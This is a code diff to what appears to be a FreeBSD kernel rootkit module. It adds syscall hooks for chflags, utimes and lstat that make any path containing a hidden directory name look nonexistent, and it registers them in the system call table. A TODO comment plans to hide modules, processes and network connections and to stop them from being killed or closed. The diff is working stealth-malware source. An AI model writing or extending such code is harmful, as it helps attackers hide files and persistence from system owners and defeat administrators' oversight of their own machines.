@@ -12,6 +12,13 @@
  * Last Update:
  *      2013-02-24
  *
+ * TODO:
+ *      1. Hide modules from kldstat
+ *      2. Prevent modules from unloading
+ *      3. Hide processes
+ *      4. Prevent processes from getting killed
+ *      5. Hide connections
+ *      6. Prevent connections from being closed
 */
 /* General Headers */
 #include <sys/types.h>
@@ -177,6 +184,58 @@ static int chown_hook(struct thread *td, void *syscall_args)
     return (sys_chown(td, syscall_args));
 }
 
+/* chflags hook - prevent file/directory flag changing */
+static int chflags_hook(struct thread *td, void *syscall_args)
+{
+    struct chflags_args /*{
+        const char *path;
+        u_long flags;
+    }*/ *args;
+    args = (struct chflags_args *)syscall_args;
+
+    /* Copy arguments to kernel space */
+    char path[NAME_MAX];
+    size_t copied;
+    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
+        /* Error Copying Path */
+        return (EFAULT);
+    }
+
+    /* Check if the path contains the HIDDENDIR */
+    if(strstr(path, HIDDENDIR)) {
+        return (ENOENT);
+    }
+
+    /* Otherwise, call the original system call */
+    return (sys_chflags(td, syscall_args));
+}
+
+/* utimes hook - prevent file/directory access and modification time change */
+static int utimes_hook(struct thread *td, void *syscall_args)
+{
+    struct utimes_args /*{
+        const char *path;
+        const struct timeval *times;
+    }*/ *args;
+    args = (struct utimes_args *)syscall_args;
+
+    /* Copy arguments to kernel space */
+    char path[NAME_MAX];
+    size_t copied;
+    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
+        /* Error Copying Path */
+        return (EFAULT);
+    }
+
+    /* Check if the path contains the HIDDENDIR */
+    if(strstr(path, HIDDENDIR)) {
+        return (ENOENT);
+    }
+
+    /* Otherwise, call the original system call */
+    return (sys_utimes(td, syscall_args));
+}
+
 /* truncate hook - prevent file truncating */
 static int truncate_hook(struct thread *td, void *syscall_args)
 {
@@ -250,13 +309,38 @@ static int stat_hook(struct thread *td, void *syscall_args)
         return (EFAULT);
     }
 
-    /* Check if directory/file to be opened contains HIDDENDIR */
+    /* Check if directory/file to be checked contains HIDDENDIR */
     if(strstr(path, HIDDENDIR)) {
         return (ENOENT);
     }
 
     /* Otherwise, call the original system call */
     return (sys_stat(td, syscall_args));
+}
+
+/* lstat hook - Hide file/direcotry status */
+static int lstat_hook(struct thread *td, void *syscall_args)
+{
+    struct lstat_args /*{
+        const char *path;
+        struct stat *sb;
+    }*/ *args;
+    args = (struct lstat_args *)syscall_args;
+
+    /* Copy arguments to kernel space */
+    char path[NAME_MAX];
+    size_t copied;
+    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
+        return (EFAULT);
+    }
+
+    /* Check if directory/file to be checked contains HIDDENDIR */
+    if(strstr(path, HIDDENDIR)) {
+        return (ENOENT);
+    }
+
+    /* Otherwise, call the original sytem call */
+    return (sys_lstat(td, syscall_args));
 }
 
 /* chdir hook - prevent directory traversal to the hiddendir */
@@ -396,6 +480,9 @@ static int load(struct module *module, int cmd, void *arg)
             sysent[SYS_chown].sy_call = (sy_call_t *)chown_hook;
             sysent[SYS_truncate].sy_call = (sy_call_t *)truncate_hook;
             sysent[SYS_stat].sy_call = (sy_call_t *)stat_hook;
+            sysent[SYS_lstat].sy_call = (sy_call_t *)lstat_hook;
+            sysent[SYS_chflags].sy_call = (sy_call_t *)chflags_hook;
+            sysent[SYS_utimes].sy_call = (sy_call_t *)utimes_hook;
             break;
         case MOD_UNLOAD:
             #if KERNDEBUG == 1
@@ -411,6 +498,9 @@ static int load(struct module *module, int cmd, void *arg)
             sysent[SYS_chown].sy_call = (sy_call_t *)sys_chown;
             sysent[SYS_truncate].sy_call = (sy_call_t *)sys_truncate;
             sysent[SYS_stat].sy_call = (sy_call_t *)sys_stat;
+            sysent[SYS_lstat].sy_call = (sy_call_t *)sys_lstat;
+            sysent[SYS_chflags].sy_call = (sy_call_t *)sys_chflags;
+            sysent[SYS_utimes].sy_call = (sy_call_t *)sys_utimes;
             break;
         default:
             error = EOPNOTSUPP; /* Operation not supported */
